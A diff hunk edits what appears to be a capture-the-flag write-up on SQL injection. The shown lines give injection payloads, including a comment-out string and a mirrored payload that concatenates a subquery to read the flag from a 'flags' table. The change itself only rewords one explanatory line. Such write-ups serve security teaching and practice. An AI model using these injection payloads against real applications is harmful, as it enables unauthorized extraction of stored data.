@@ -76,7 +76,7 @@ connection.execute('''
 payload: ```')--```
 payload supplied : ```')---)'```
 
-and we can see we get a blank input meaning our payload worked! and we know the flag is in the flags table so we can use the ```'%'||(query)||'%'``` to get an element from another table
+and we can see we get a blank input meaning our payload worked! and we know the flag is in the flags table so we can use the ```||(query)||``` to get an element from another table
 
 payload : ```%'||(SELECT flag FROM flags)||'%');---;)'%'||)sgalf MORF galf TCELES(||'% ``` 
 
